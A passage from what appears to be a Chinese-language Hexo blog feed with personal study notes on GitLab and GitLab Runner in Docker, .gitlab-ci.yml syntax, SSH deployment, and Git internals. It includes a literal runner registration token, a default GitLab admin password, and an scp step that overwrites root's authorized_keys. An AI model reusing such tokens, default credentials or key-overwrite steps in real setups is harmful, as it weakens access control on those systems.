class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-attr">version:</span> <span class="hljs-string">&#x27;3.8&#x27;</span><br><span class="hljs-attr">services:</span><br> <span class="hljs-attr">gitlab:</span><br>   <span class="hljs-attr">hostname:</span> <span class="hljs-string">&#x27;&#x27;</span><br>   <span class="hljs-attr">image:</span> <span class="hljs-string">&#x27;gitlab/gitlab-ce:14.2.4-ce.0&#x27;</span><br>   <span class="hljs-attr">restart:</span> <span class="hljs-string">always</span><br>   <span class="hljs-attr">environment:</span><br>     <span class="hljs-attr">GITLAB_OMNIBUS_CONFIG:</span> <span class="hljs-string">|</span><br><span class="hljs-string">       external_url &#x27;http://:9080&#x27;</span><br><span class="hljs-string">       gitlab_rails[&#x27;gitlab_shell_ssh_port&#x27;] = 9022</span><br><span class="hljs-string">       gitlab_rails[&#x27;time_zone&#x27;] = &#x27;Asia/Shanghai&#x27;</span><br><span class="hljs-string"></span>   <span class="hljs-attr">ports:</span><br>     <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;9080:9080&#x27;</span><br>     <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;9022:22&#x27;</span><br>   <span class="hljs-attr">volumes:</span><br>     <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;$GITLAB_HOME/config:/etc/gitlab&#x27;</span><br>     <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;$GITLAB_HOME/logs:/var/log/gitlab&#x27;</span><br>     <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;$GITLAB_HOME/data:/var/opt/gitlab&#x27;</span><br></code></pre></td></tr></table></figure><p>注意这里的 <code>hostname</code> 和 <code>external_url</code> 部分要自己补全.</p><p>之后在含有 <code>docker-compose.yml</code> 的目录下执行 <code>docker-compose up -d</code> 即可.</p><p>初始密码在 <code>$GITLAB_HOME/config/initial_root_password</code> 文件中.</p><h2 id="关于-gitlab-runner"><a href="#关于-gitlab-runner" class="headerlink" title="关于 gitlab runner"></a>关于 gitlab runner</h2><p><a href="https://docs.gitlab.com/runner/install/docker.html">用容器运行 runner 的官方文档</a></p><p>runners 是用来运行 CI&#x2F;CD jobs 的代理.</p><p>shared runners 意味着所有的 projects 都可以使用这个 runner 来运行服务.</p><p>Gitlab runner 的 docker 镜像基于 Ubuntu 或 Alpine.</p><p>以下两行命令等效:<br>在容器内执行:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ gitlab-runner &lt;runner <span class="hljs-built_in">command</span> and options...&gt;<br></code></pre></td></tr></table></figure><p>在容器外执行的版本:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ docker run &lt;chosen docker options...&gt; gitlab/gitlab-runner &lt;runner <span class="hljs-built_in">command</span> and options...&gt;<br></code></pre></td></tr></table></figure><p>其会创建一个容器，但似乎无法进入. 主要操作就是修改挂载的 volume 然后重新加载容器.</p><p>常见的用法如:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ docker run --<span class="hljs-built_in">rm</span> -t -i gitlab/gitlab-runner --<span class="hljs-built_in">help</span><br></code></pre></td></tr></table></figure><p>这里添加 <code>--rm</code> 参数表明用该容器执行命令后删除.</p><h3 id="创建一个-gitlab-runner"><a href="#创建一个-gitlab-runner" class="headerlink" title="创建一个 gitlab runner"></a>创建一个 gitlab runner</h3><p>利用 docker:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ docker run -d --name gitlab-runner --restart always \<br>      -v /srv/gitlab-runner/config:/etc/gitlab-runner \<br>      -v /var/run/docker.sock:/var/run/docker.sock \<br>      gitlab/gitlab-runner:latest<br><br></code></pre></td></tr></table></figure><p>这里没什么需要修改的，直接用即可.</p><h3 id="给某个-gitlab-注册-runner"><a href="#给某个-gitlab-注册-runner" class="headerlink" title="给某个 gitlab 注册 runner"></a>给某个 gitlab 注册 runner</h3><p><a href="https://docs.gitlab.com/runner/register/index.html#docker">runner 注册的官方文档</a></p><p>将 gitlab 容器和 gitlab runner 产生联系需利用 registration token:<br><img src="/../img/whereis_token.png"></p><p>这里只是获取 registration token 的内容，用来标识这个 gitlab.</p><p>注册过程需使用另一个镜像, 脚本如下:</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">  docker run <span class="hljs-params">--rm</span> -v <span class="hljs-string">/srv/gitlab-runner/config</span>:<span class="hljs-string">/etc/gitlab-runner</span> gitlab/gitlab-runner register \<br><span class="hljs-params">--non-interactive</span> \<br><span class="hljs-params">--executor</span> <span class="hljs-string">&quot;docker&quot;</span> \<br><span class="hljs-params">--docker-image</span> alpine<span class="hljs-function">:latest</span> \<br><span class="hljs-params">--url</span> <span class="hljs-string">&quot;http://10.0.8.3:9080/&quot;</span> \<br><span class="hljs-params">--registration-token</span> <span class="hljs-string">&quot;wknr7omKyoP7xXYQ9ncb&quot;</span> \<br><span class="hljs-params">--description</span> <span class="hljs-string">&quot;second-register-runner&quot;</span> \<br><span class="hljs-params">--tag-list</span> <span class="hljs-string">&quot;testGitlab&quot;</span> \<br><span class="hljs-params">--run-untagged=</span><span class="hljs-string">&quot;true&quot;</span> \<br><span class="hljs-params">--locked=</span><span class="hljs-string">&quot;false&quot;</span> \<br><span class="hljs-params">--access-level=</span><span class="hljs-string">&quot;not_protected&quot;</span><br></code></pre></td></tr></table></figure><p>注意一些参数的修改. 如 <code>--url</code> 为 gitlab 所在的地址，<code>--registration-token</code> 为 gitlab 上的 token.</p><p>若 <code>--excutor</code> 为 docker, 注意在 <code>/srv/gitlab-runner/config/config.toml</code> 文件中添加 <code>clone-url</code>:</p><p><img src="/../img/clone_url_solution.png"></p><p>不然可能会报错. 如:</p><p><img src="/../img/gitlab-ci-unable-to-access.png"></p><p>因为执行环境为 docker, 这里仓库的地址又不是公网 ip, docker 使用 <code>127.0.0.1</code> 就会报错.</p><p>也可以手动交互式输入:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ docker run --<span class="hljs-built_in">rm</span> -it -v /srv/gitlab-runner/config:/etc/gitlab-runner gitlab/gitlab-runner register<br></code></pre></td></tr></table></figure><p>注册之前需要先有 runner 服务. 这里的注册操作其实就是通过修改 <code>/srv/gitlab-runner/config/config.toml</code> 来实现，只不过是先挂载到一个容器中，修改之后将这个容器删除，但是根据 volume 的性质，修改是保存了的. 因此注册实际上就是将 gitlab 服务器和 token 等信息写入 runner 的配置文件.</p><p><a href="https://docs.gitlab.com/runner/configuration/advanced-configuration.html">runner 配置文件官方文档</a></p><p>修改 <code>config.toml</code> 文件. 使用 TOML 的格式.</p><p>Gitlab Runner 每 3 秒检查一次配置修改，在必要情况下重新加载配置文件.</p><p>如果注册后将 runner 停止运行，pipline 在运行是就会一直 pending.</p><h1 id="自动部署项目示例"><a href="#自动部署项目示例" class="headerlink" title="自动部署项目示例"></a>自动部署项目示例</h1><p><a href="https://blog.csdn.net/weixin_47872288/article/details/124818005">参考</a></p><h1 id="参考-B-站系列视频"><a href="#参考-B-站系列视频" class="headerlink" title="参考 B 站系列视频"></a><a href="https://www.bilibili.com/video/BV1kA411L7jS/?spm_id_from=333.999.0.0&vd_source=bc8ddbb1a08707dc809c3fd9bb85290d">参考 B 站系列视频</a></h1><h2 id="关于-CI-x2F-CD"><a href="#关于-CI-x2F-CD" class="headerlink" title="关于 CI&#x2F;CD"></a>关于 CI&#x2F;CD</h2><p>gitlab CI 指 Continuous Integration.</p><p>gitlab CD 指 Continuous Delivery 和 Continuous Deployment.</p><p>pipline, 流水线的模式. 分阶段和任务. 任务是最小单元.</p><p>pipline -&gt; stages -&gt; jobs</p><p><code>.gitlab-ci.yml</code> 文件是 CI 的配置文件，其放在仓库中.</p><h1 id="参考官方文档编写-gitlab-ci-yml-文件"><a href="#参考官方文档编写-gitlab-ci-yml-文件" class="headerlink" title="参考官方文档编写 .gitlab-ci.yml 文件"></a><a href="https://docs.gitlab.com/ee/ci/yaml/gitlab_ci_yaml.html">参考官方文档编写 <code>.gitlab-ci.yml</code> 文件</a></h1><p>该文件可能包含的内容:</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">stages</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">build</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">test</span><br><br><span class="hljs-attribute">build-code-job</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">stage</span><span class="hljs-punctuation">:</span> <span class="hljs-string">build</span><br>  <span class="hljs-attribute">script</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">echo &quot;Check the ruby version, then build some Ruby project files:&quot;</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">ruby -v</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">rake</span><br><br><span class="hljs-attribute">test-code-job1</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">stage</span><span class="hljs-punctuation">:</span> <span class="hljs-string">test</span><br>  <span class="hljs-attribute">script</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">echo &quot;If the files are built successfully, test some files with one command:&quot;</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">rake test1</span><br><br><span class="hljs-attribute">test-code-job2</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">stage</span><span class="hljs-punctuation">:</span> <span class="hljs-string">test</span><br>  <span class="hljs-attribute">script</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">echo &quot;If the files are built successfully, test other files with a different command:&quot;</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">rake test2</span><br><br></code></pre></td></tr></table></figure><p>首先定义了两个 stages, 之后定义的都是 jobs, 其中选定其属于哪一个 stage.</p><p><code>scripts</code> 之下是脚本的内容.</p><p>所有的语法文档 <a href="https://docs.gitlab.com/ee/ci/yaml/index.html">参见</a></p><p>若某个 job 需要让一个 container 来运行，则在其中添加如:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">image</span>: ruby:<span class="hljs-number">2</span>.<span class="hljs-number">7</span>.<span class="hljs-number">5</span><br></code></pre></td></tr></table></figure><p>每一个 job 板块都需要包含 <code>stage</code> 和 <code>scripts</code></p><p><a href="https://fizzz.blog.csdn.net/article/details/111029151">参考 B 站老哥</a></p><p>重要的关键词: stage, script, retry, image, tags, only&#x2F;except, when, cache.</p><p>若没有自己定义 stage 数组，则默认的 stage 有:</p><ul><li><code>.pre</code></li><li><code>build</code></li><li><code>test</code></li><li><code>deploy</code></li><li><code>.post</code></li></ul><p>任务的执行是按照阶段 stage 定义的顺序执行，而不是你写 job 的顺序.</p><p>同一个 stage 中的 jobs 的并发执行数量在 runner 的配置文件中定义，默认为一.</p><h3 id="retry"><a href="#retry" class="headerlink" title="retry"></a>retry</h3><p>retry 关键词设置的范围是 0~2. 如:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">retry</span>: <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>或:</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">retry</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">max</span><span class="hljs-punctuation">:</span> <span class="hljs-string">2</span><br>  <span class="hljs-attribute">when</span><span class="hljs-punctuation">: </span><br>    <span class="hljs-bullet">-</span> <br>    <span class="hljs-bullet">-</span> <br></code></pre></td></tr></table></figure><h3 id="image"><a href="#image" class="headerlink" title="image"></a>image</h3><p>既可以定义全局，也可以指定某个任务.</p><h3 id="tags"><a href="#tags" class="headerlink" title="tags"></a>tags</h3><p>指定 runner.</p><h3 id="only-x2F-except"><a href="#only-x2F-except" class="headerlink" title="only&#x2F;except"></a>only&#x2F;except</h3><p>限定当前任务执行的条件.</p><h3 id="cache"><a href="#cache" class="headerlink" title="cache"></a>cache</h3><p>缓存当前工作环境目录中的一些文件，在某个任务初始化时恢复.</p><p>其下一般用到两个关键词: </p><ul><li>key</li><li>paths</li></ul><p>前者标识这次缓存, 后者指明文件的路径.</p><p>检出缓存似乎不需要手动检出，而是在每个阶段开始时自动检出. 每次检出后又会缓存.</p><h3 id="变量的使用"><a href="#变量的使用" class="headerlink" title="变量的使用"></a>变量的使用</h3><p>在 <code>.gitlab-ci.yml</code>  文件中定义变量.</p><p>使用 <code>variable:</code> , 变量名最好都用大写如:</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">variables:</span><br><span class="hljs-symbol">  MT_VAR:</span> <span class="hljs-string">&quot;my name is ...&quot;</span><br><span class="hljs-symbol">  TEST:</span> <span class="hljs-string">&quot;The second var&quot;</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">log_var:</span><br><span class="hljs-symbol">  script:</span><br>    - echo $MT_VAR<br></code></pre></td></tr></table></figure><p>两个 flag, <code>Protect variable</code>, 表明只有在保护分支中才能使用该变量.</p><p><code>Mask variable</code> 表明在 pipline 中不会直接显示.</p><p>pipline 中有预定义的变量.</p><p>使用 <code>export</code> 可以导出所有变量:</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-attr">script:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">export</span><br></code></pre></td></tr></table></figure><h2 id="流水线类型"><a href="#流水线类型" class="headerlink" title="流水线类型"></a>流水线类型</h2><p><a href="https://docs.gitlab.com/ee/ci/pipelines/">官方文档</a></p><h3 id="DAG-流水线-Directed-Acyclic-Graphs"><a href="#DAG-流水线-Directed-Acyclic-Graphs" class="headerlink" title="DAG 流水线 (Directed Acyclic Graphs)"></a>DAG 流水线 (Directed Acyclic Graphs)</h3><p>适用于多平台部署:</p><p><img src="/../img/DAG_pipline.png"></p><p>设置依赖关系. 用 <code>needs</code> 关键词, 如:</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">test_a:</span><br><span class="hljs-symbol">  stage:</span> test<br><span class="hljs-symbol">  needs:</span> [build_a]<br><span class="hljs-symbol">  script:</span><br>    - echo <span class="hljs-string">&quot;...&quot;</span><br></code></pre></td></tr></table></figure><p>方括号里面为其他 job 的名称.</p><h3 id="父子流水线"><a href="#父子流水线" class="headerlink" title="父子流水线"></a>父子流水线</h3><p>在同一个项目中子目录下也有 <code>.gitlab-ci.yml</code> 文件，也就是配置字流水线.</p><p>触发式. 使用 <code>trigger</code>, <code>include</code> 和 <code>rules</code> 关键词.</p><p>如:</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">trigger_a</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">stage</span><span class="hljs-punctuation">:</span> <span class="hljs-string">test</span><br>  <span class="hljs-attribute">trigger</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">include</span><span class="hljs-punctuation">:</span> <span class="hljs-string">a/.gitlab-ci.yml</span><br>  <span class="hljs-attribute">rules</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">change:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">a/*</span><br></code></pre></td></tr></table></figure><p>这里 <code>triger</code> 和 <code>include</code> 就是指明子流水线的配置文件位置.</p><p><code>rules</code> 就是指明什么时候执行 <code>triger</code> 下的流水线.</p><h3 id="多项目流水线"><a href="#多项目流水线" class="headerlink" title="多项目流水线"></a>多项目流水线</h3><p>触发另一个项目的流水线. 就是有多个 project.</p><p>示例:</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">trigger_c:</span><br><span class="hljs-symbol">  stage:</span> triggers<br><span class="hljs-symbol">  trigger:</span><br><span class="hljs-symbol">    project:</span> root/...    <span class="hljs-meta"># 指明 project 的位置</span><br><span class="hljs-symbol">    branch:</span> master       <span class="hljs-meta"># 指明哪个分支</span><br><span class="hljs-symbol">    strategy:</span> depend<br></code></pre></td></tr></table></figure><p>这里没有指定触发条件.</p><h3 id="合并流水线"><a href="#合并流水线" class="headerlink" title="合并流水线"></a>合并流水线</h3><p>合并的时候触发.</p><p>在一个 job 下添加:</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">only</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">merge_requests</span><br></code></pre></td></tr></table></figure><h3 id="流水线的触发"><a href="#流水线的触发" class="headerlink" title="流水线的触发"></a>流水线的触发</h3><p>推送代码时，定时，url, 手动触发.</p><h2 id="远程服务器部署"><a href="#远程服务器部署" class="headerlink" title="远程服务器部署"></a>远程服务器部署</h2><p><a href="https://docs.gitlab.com/ee/ci/ssh_keys/">官方关于 ssh</a></p><p>主要原理就是利用 ssh 将文件上传到目标主机 (即要发布项目的主机).</p><p>现在 gitlab runner 所在主机生成 ssh 的密钥对，然后将公钥传给项目部署所在的主机:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ ssh-keygen -t rsa -b 2048 -C <span class="hljs-string">&quot;email@example.com&quot;</span><br>$ scp -r id_rsa.pub root@1.2.3.4:/root/.ssh/authorized_keys<br></code></pre></td></tr></table></figure><p><code>.gitlab-ci.yml</code> 文件内容:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">job-deploy:<br>  stage: deploy<br>  before_script:<br>    - <span class="hljs-string">&#x27;which ssh-agent || ( yum update -y &amp;&amp; yum install openssh-client git -y )&#x27;</span><br>    - <span class="hljs-built_in">eval</span> $(ssh-agent -s)  <span class="hljs-comment"># 会输出一些环境变量及值</span><br>    - <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$SSH_PRIVATE_KEY</span>&quot;</span> | <span class="hljs-built_in">tr</span> -d <span class="hljs-string">&#x27;\r&#x27;</span> | ssh-add -<br>    - <span class="hljs-built_in">mkdir</span> -p ~/.ssh<br>    - <span class="hljs-built_in">chmod</span> 700 ~/.ssh   <span class="hljs-comment"># 这一部分在将私钥放在 runner 所在的服务器</span><br>    - ssh-keyscan ... &gt;&gt; ~/.ssh/knon_hosts<br>    - <span class="hljs-built_in">chmod</span> 644 ~/.ssh/known_hosts<br>  script:<br>    - <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;start scp&#x27;</span><br>    - scp -r dist root@...<br></code></pre></td></tr></table></figure><h2 id="调试手段"><a href="#调试手段" class="headerlink" title="调试手段"></a>调试手段</h2>]]></content>
    
    
    <categories>
      
      <category>Git</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于-github-和-gitlab-的区别</title>
    <link href="/2022/11/05/%E5%85%B3%E4%BA%8E-github-%E5%92%8C-gitlab-%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
    <url>/2022/11/05/%E5%85%B3%E4%BA%8E-github-%E5%92%8C-gitlab-%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
    
    <content type="html"><![CDATA[<p>Github 中创建私有仓库需要收费，而 Gitlab 不需要.</p>]]></content>
    
    
    <categories>
      
      <category>Git</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Pro-Git-Notes</title>
    <link href="/2022/11/04/Pro-Git-Notes/"/>
    <url>/2022/11/04/Pro-Git-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="第4章-Git-服务器"><a href="#第4章-Git-服务器" class="headerlink" title="第4章 Git 服务器"></a>第4章 Git 服务器</h1><h2 id="4-8-GitLab"><a href="#4-8-GitLab" class="headerlink" title="4.8 GitLab"></a>4.8 GitLab</h2><h3 id="4-8-1-安装"><a href="#4-8-1-安装" class="headerlink" title="4.8.1 安装"></a>4.8.1 安装</h3><p>GitLab 是使用数据库的 Web 应用.</p><p>可以从 <a href="https://bitnami.com/stack/gitlab">这个网站</a> 下载镜像.</p><h3 id="4-8-2-管理"><a href="#4-8-2-管理" class="headerlink" title="4.8.2 管理"></a>4.8.2 管理</h3><p>GitLab 的管理界面使用过 Web 访问的.</p><p>在浏览器中输入安装有 GitLab 的服务器的主机名或者 IP 地址， 然后使用管理员身份登陆.</p><p>默认用户名是 <code>admin@local.host</code>. 默认密码是 <code>5iveL!fe</code></p><h1 id="第10章-Git-内幕"><a href="#第10章-Git-内幕" class="headerlink" title="第10章 Git 内幕"></a>第10章 Git 内幕</h1><p><code>.git</code> 目录下的:</p><ul><li>description 文件仅限于 GitWeb 程序使用. </li><li>config 文件包含配置</li><li>info 目录包含一个全局性排除文件, 记录不希望放在 <code>.gitignore</code> 文件中的忽略模式.</li><li>hooks 目录包含客户端或服务器钩子脚本</li></ul><p>剩下的重要文件或目录:</p><ul><li>object 目录，存储个人数据库的所有内容, 所有的对象都在这里</li><li>refs 目录，存储指针, 指向数据的提交对象</li><li>HEAD 文件，指向已检出的分支</li><li>index 文件，Git 用来保存暂存区信息.</li></ul><h2 id="10-2-Git-对象"><a href="#10-2-Git-对象" class="headerlink" title="10.2 Git 对象"></a>10.2 Git 对象</h2><p>Git 的核心就是一个简单的 “键-值” 数据存储.</p><p>用到的一个命令:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;test content&#x27;</span> | git hash-object -w --stdin <br></code></pre></td></tr></table></figure><p><code>hash-object</code> 表明要生成一个 blob 对象，其返回一个哈希值，<code>-w</code> 参数表示保存这个对象，<code>--stdin</code> 表明从 stdin 获取输入.</p><p>SHA-1 的散列值是 40 个字符的校验和. 其由存储的内容加上头部信息计算得出.</p><p>相同的内容会得到相同的散列值. 而这个散列值只会保存一份. 其只和文件内容相关，和文件名无关. git 不会存储文件名.</p><p>显示内容的命令:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ git cat-file -p 哈希值<br></code></pre></td></tr></table></figure><p>这里的 <code>-p</code> 参数可能为 <code>print</code>, <code>cat-file</code> 后面必须加一个参数.</p><p>使用 <code>-t</code> (type) 参数可以获取类型.</p><h3 id="10-2-1-树对象"><a href="#10-2-1-树对象" class="headerlink" title="10.2.1 树对象"></a>10.2.1 树对象</h3><p>其解决了存储文件名的问题.</p><p>树对象相当于目录，blob 对象相当于文件内容.</p><p><img src="/../img/git_tree_object.png"></p><p>同样用 <code>cat-file</code> 查看树对象内容. 如:<br><img src="/../img/content_of_git_tree_object.png"></p><p>可以看到，其保存了文件名. 也就是说，只有 <code>commit</code> 之后才会保存文件名. <code>add</code> 只能保存文件内容.</p><p>底层命令将文件添加至暂存区:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ git update-index --add --cacheinfo 100644 \<br>  哈希值 文件名<br></code></pre></td></tr></table></figure><p>这里的 “文件名” 可以取其他的，其会最终存入树对象中.</p><p>其会修改 <code>.git/index</code> 文件的内容，</p><p>将树对象加入暂存区使用 <code>read-tree</code> 命令:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ git read-tree --prefix=bak 树对象的哈希值<br>$ git write-tree<br></code></pre></td></tr></table></figure><p><code>--prefix</code> 参数即这个树对象名, 自己取即可.</p><h3 id="10-2-2-提交对象"><a href="#10-2-2-提交对象" class="headerlink" title="10.2.2 提交对象"></a>10.2.2 提交对象</h3><p>创建提交对象需要使用 <code>commit-tree</code> 命令. 需指明一个树对象的哈希值和父提交对象 (如果有).</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;first commit&#x27;</span> | git commit-tree 哈希值<br></code></pre></td></tr></table></figure><p>或:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;first commit&#x27;</span> | git commit-tree 哈希值 -p 父提交哈希值<br></code></pre></td></tr></table></figure><p>提交对象的格式:</p><ul><li>快照顶层树对象</li><li>作者信息 (user.name, user.email) 和时间戳</li><li>空行</li><li>提交消息</li></ul><h3 id="10-2-3-对象存储"><a href="#10-2-3-对象存储" class="headerlink" title="10.2.3 对象存储"></a>10.2.3 对象存储</h3><p>Git 构造出以对象类型作为开头的头部信息:</p><ul><li>对象类型</li><li>空格</li><li>内容的长度</li><li>空字节</li></ul><p>Ruby 代码:</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-meta prompt_">&gt;&gt;</span> header = <span class="hljs-string">&quot;blob <span class="hljs-subst">#&#123;content.length&#125;</span>\0&quot;</span><br></code></pre></td></tr></table></figure><p>Git 将头部信息和原始内容拼接在一起，计算 SHA-1 校验和.</p><p>然后用校验和的前两位作为子目录名，剩余为文件名，将原始内容用 zlib 压缩并存储在这个文件中.</p><p>因此，校验和只是标记路径，和内容无关.</p><h2 id="10-3-Git-引用"><a href="#10-3-Git-引用" class="headerlink" title="10.3 Git 引用"></a>10.3 Git 引用</h2><p>Git 中的 “引用” (reference 或 ref) 就是用文件来存储 SHA-1 值，然后将这个文件当作一个指针.</p><p>位于 <code>.git/refs</code> 下.</p><p>更新某个引用，使用 <code>update-ref</code> 命令:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ git update-ref refs/heads/master 哈希值<br></code></pre></td></tr></table></figure><p>执行 <code>git branch</code> 这样的命令，Git 会使用 <code>update-ref</code> 命令将当前分支中最后一次提交的 SHA-1 添加到你要创建的新引用中.</p><h3 id="10-3-1-HEAD"><a href="#10-3-1-HEAD" class="headerlink" title="10.3.1 HEAD"></a>10.3.1 HEAD</h3><p>HEAD 文件是一个到当前所在分支的符号引用.</p><p>执行 <code>git commit</code> 命令时，该命令会创建一个提交对象，并把该提交对象的父对象设置为 HEAD 文件中引用所指向的 SHA-1 值. (即当前分支)</p><p>可利用 <code>git symbolic-ref HEAD</code> 命令来读取 HEAD 的值.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ git symbolic-ref HEAD<br></code></pre></td></tr></table></figure><p>设置:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ git symbolic-ref HEAD refs/heads/test<br></code></pre></td></tr></table></figure><h3 id="10-3-2-标签对象"><a href="#10-3-2-标签对象" class="headerlink" title="10.3.2 